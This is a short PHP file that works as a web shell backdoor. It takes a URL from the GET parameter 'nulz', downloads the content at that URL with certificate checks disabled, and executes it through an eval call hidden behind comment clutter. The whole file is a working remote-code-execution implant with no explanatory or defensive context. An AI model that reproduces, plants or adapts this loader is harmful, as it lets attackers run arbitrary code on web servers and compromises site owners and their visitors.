<?php
$this_f = '';
function fget($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    	  return curl_exec($ch);
          curl_close($ch);
}

if (isset($_GET['nulz'])) {
        $get_f = $_GET['nulz'];
        $this_f = fget($get_f);
}

/*555555*/eval/*555555*/("?>".$this_f)/****#****/;
?>
